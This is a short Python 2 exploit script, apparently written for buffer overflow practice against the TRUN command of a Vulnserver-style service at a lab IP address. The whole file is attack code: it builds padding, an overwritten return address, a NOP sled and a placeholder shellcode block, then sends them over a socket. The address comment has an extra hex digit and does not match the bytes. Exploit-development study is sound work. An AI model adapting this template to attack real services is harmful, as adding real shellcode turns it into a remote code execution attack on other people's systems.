#! /usr/bin/python
import sys, socket
from time import sleep

padding = "A" * 2003

eip = "\xaf\x11\x50\x62" # 0x625011AF1

nopsled = "\x90" * 32

shellcode = "C" * 400


buffer = padding + eip + nopsled + shellcode

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.54.141',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()

except:
	print "CRASH!"
	sys.exit()
